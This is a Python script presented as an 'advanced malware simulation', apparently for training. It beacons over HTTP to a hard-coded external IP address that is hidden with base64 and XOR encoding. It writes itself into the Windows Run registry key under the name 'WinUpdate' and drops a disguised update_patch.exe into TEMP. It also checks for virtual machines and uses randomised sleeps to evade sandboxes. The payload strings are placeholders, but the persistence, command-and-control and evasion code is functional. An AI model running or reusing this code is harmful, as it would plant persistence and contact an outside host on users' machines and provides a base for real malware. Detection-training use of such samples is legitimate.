import os
import time
import base64
import requests
import ctypes
import winreg
import random

# XOR Obfuscation Function
def xor_encrypt_decrypt(data, key="mophshadow"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# Base64 Encode/Decode
def encode_b64(data):
    return base64.b64encode(data.encode()).decode()

def decode_b64(data):
    return base64.b64decode(data).decode()

# Simulate C2 Communication
def simulate_c2():
    url = decode_b64("aHR0cDovLzIyMi4yNDYuMTA4LjE5ODo1OTQyMC8=")  # Decoded: "http://222.246.108.198:59420/"
    payload = xor_encrypt_decrypt("Hello from infected host", "mophshadow")
    
    headers = {"User-Agent": xor_encrypt_decrypt("Malware-Training")}
    
    try:
        response = requests.post(url, data={"data": encode_b64(payload)}, headers=headers)
        print(f"[+] C2 Communication Sent: {response.status_code}")
    except requests.RequestException:
        print("[-] C2 Server Unreachable")

# Simulate Persistence via Registry
def simulate_persistence():
    key = winreg.HKEY_CURRENT_USER
    subkey = decode_b64("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")  # "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    value_name = xor_encrypt_decrypt("WinUpdate")
    value_data = os.path.abspath(__file__)

    try:
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, value_data)
        print("[+] Persistence Mechanism Set in Registry")
    except Exception as e:
        print(f"[-] Registry Write Failed: {e}")

# Simulate File Dropper
def simulate_file_drop():
    file_path = os.path.join(os.getenv("TEMP"), xor_encrypt_decrypt("update_patch.exe"))
    encoded_content = encode_b64(xor_encrypt_decrypt("Fake Malware Payload"))

    with open(file_path, "w") as file:
        file.write(encoded_content)
    print(f"[+] File Dropped: {file_path}")

# Simulate Process Injection
def simulate_process_injection():
    print("[+] Simulating Process Injection into explorer.exe")
    ctypes.windll.kernel32.Sleep(1000)  # Fake API Call to simulate behavior

# Simulate Anti-Analysis (Detecting Virtual Machine / Debugger)
def simulate_evasion():
    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe"]
    
    for proc in os.popen('tasklist').read().splitlines():
        if any(susp in proc.lower() for susp in suspicious_processes):
            print("[-] Running inside a VM - Exiting...")
            exit()

    print("[+] Simulated Anti-Analysis Passed")
    time.sleep(random.randint(5, 15))  # Randomized sleep to avoid sandbox analysis

# Run Simulation
if __name__ == "__main__":
    print("[*] Starting Advanced Malware Simulation...")
    simulate_evasion()
    simulate_c2()
    simulate_persistence()
    simulate_file_drop()
    simulate_process_injection()
    print("[*] Simulation Completed!")
